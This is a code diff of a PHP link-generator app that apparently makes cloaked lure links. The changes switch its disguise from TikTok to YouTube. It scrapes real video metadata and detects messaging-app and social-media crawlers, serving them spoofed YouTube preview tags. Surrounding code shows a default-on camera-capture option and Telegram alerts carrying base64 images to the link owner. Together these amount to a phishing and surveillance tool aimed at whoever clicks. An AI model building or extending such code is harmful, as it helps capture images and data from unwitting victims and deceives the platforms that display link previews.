@@ -116,55 +116,73 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// Strong function to fetch TikTok metadata (protected against blocks)
-function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
-    
-    // 1. Try oEmbed (best method)
-    $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
+// Extract YouTube video ID from various URL formats
+function extract_youtube_id($url) {
+    $patterns = [
+        '/(?:youtube\.com\/watch\?[^#]*?v=|youtu\.be\/|youtube\.com\/embed\/|youtube\.com\/shorts\/|youtube\.com\/v\/|m\.youtube\.com\/watch\?[^#]*?v=)([a-zA-Z0-9_-]{11})/',
+        '/[?&]v=([a-zA-Z0-9_-]{11})/',
+    ];
+    foreach ($patterns as $pattern) {
+        if (preg_match($pattern, $url, $matches)) {
+            return $matches[1];
+        }
+    }
+    return null;
+}
+
+// Strong function to fetch YouTube metadata (protected against blocks)
+function fetch_youtube_meta($url) {
+    $video_id = extract_youtube_id($url);
+
+    $meta = [
+        'title'    => 'YouTube Video',
+        'image'    => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80',
+        'video_id' => $video_id
+    ];
+
+    // Default thumbnail (guaranteed to exist) if we have an ID
+    if ($video_id) {
+        $meta['image'] = "https://img.youtube.com/vi/{$video_id}/maxresdefault.jpg";
+    }
+
+    // Primary: YouTube oEmbed
+    $ch = curl_init("https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json");
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_CONNECTTIMEOUT => 4,
         CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     ]);
     $response = curl_exec($ch); curl_close($ch);
+
     if ($response) {
         $data = json_decode($response, true);
-        if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
-            $title = $data['title'];
-            if (stripos($title, 'TikTok') === false) $title = 'TikTok - ' . $title;
-            return ['title' => $title, 'image' => $data['thumbnail_url']];
+        if (!empty($data['title'])) {
+            $meta['title'] = 'YouTube - ' . $data['title'];
+            if (!empty($data['thumbnail_url'])) {
+                $meta['image'] = $data['thumbnail_url'];
+            }
+            return $meta;
         }
     }
-    
-    // 2. Try reading the page (Fallback)
+
+    // Fallback: read page meta tags
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5,
-        CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, 
+        CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false,
         CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
     ]);
     $html = curl_exec($ch); curl_close($ch);
-    
+
     if ($html) {
         if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
             $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
-        } elseif (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
-            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
         }
-
         if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $title = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
-            if (stripos($title, 'Make Your Day') !== false) {
-                if (preg_match('/"desc":"([^"]+)"/', $html, $desc_match)) {
-                    $title = html_entity_decode(stripslashes($desc_match[1]), ENT_QUOTES, 'UTF-8');
-                }
-            }
-            $meta['title'] = (stripos($title, 'TikTok') === false) ? 'TikTok - ' . $title : $title;
-        } elseif (preg_match('/"desc":"([^"]+)"/', $html, $matches)) {
-            $title = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
-            $meta['title'] = 'TikTok - ' . $title;
+            $meta['title'] = (stripos($title, 'YouTube') === false) ? 'YouTube - ' . $title : $title;
         }
     }
+
     return $meta;
 }
 
@@ -239,6 +257,10 @@ if (isset($_GET['r'])) {
         $owner_tg_chat = $link['tg_chat'];
         $owner_tg_token = $link['tg_token'];
 
+        // Extract YouTube video ID for embed meta tags
+        $video_id = extract_youtube_id($target_redirect);
+        $video_embed_url = $video_id ? "https://www.youtube.com/embed/{$video_id}" : "";
+
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
@@ -247,15 +269,28 @@ if (isset($_GET['r'])) {
             
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
+            echo '<meta property="og:site_name" content="YouTube">';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:width" content="800">';
             echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
-            echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
-            echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
-            echo '<meta property="og:video:type" content="video/mp4">';
+            if (!empty($video_embed_url)) {
+                echo '<meta property="og:video" content="' . htmlspecialchars($video_embed_url) . '">';
+                echo '<meta property="og:video:secure_url" content="' . htmlspecialchars($video_embed_url) . '">';
+                echo '<meta property="og:video:type" content="text/html">';
+                echo '<meta property="og:video:width" content="1280">';
+                echo '<meta property="og:video:height" content="720">';
+                echo '<meta name="twitter:card" content="player">';
+                echo '<meta name="twitter:player" content="' . htmlspecialchars($video_embed_url) . '">';
+                echo '<meta name="twitter:player:width" content="1280">';
+                echo '<meta name="twitter:player:height" content="720">';
+            } else {
+                echo '<meta name="twitter:card" content="summary_large_image">';
+            }
+            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta name="twitter:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '</head><body></body></html>';
             exit();
         }
@@ -464,7 +499,7 @@ if ($is_logged_in) {
         $target_url = trim($_POST['target_url']); $link_name = trim($_POST['link_name']);
         $use_camera = isset($_POST['use_camera']) ? 1 : 0;
         if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
-        $scraped = fetch_tiktok_exclusive_meta($target_url);
+        $scraped = fetch_youtube_meta($target_url);
         $code = substr(md5(uniqid(rand(), true)), 0, 7);
         $db->prepare("INSERT INTO links (user_id, name, code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?, ?, ?)")->execute([$current_user_id, $link_name, $code, $target_url, $scraped['title'], $scraped['image'], $use_camera]);
         $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code; $generated_code = $code;
@@ -650,15 +685,15 @@ if ($is_logged_in) {
                 </div>
 
                 <div class="card" style="border-color: var(--accent);">
-                    <div class="card-title">Create New TikTok Link</div>
+                    <div class="card-title">Create New YouTube Link</div>
                     <form method="POST">
                         <div class="form-group">
                             <label>Link Name</label>
                             <input type="text" name="link_name" required>
                         </div>
                         <div class="form-group">
-                            <label>TikTok Video URL</label>
-                            <input type="text" name="target_url" required>
+                            <label>YouTube Video URL</label>
+                            <input type="text" name="target_url" placeholder="https://www.youtube.com/watch?v=..." required>
                         </div>
                         <div class="form-group" style="display: flex; align-items: center; gap: 10px;">
                             <input type="checkbox" name="use_camera" value="1" checked style="width: 18px; height: 18px; accent-color: var(--accent);">
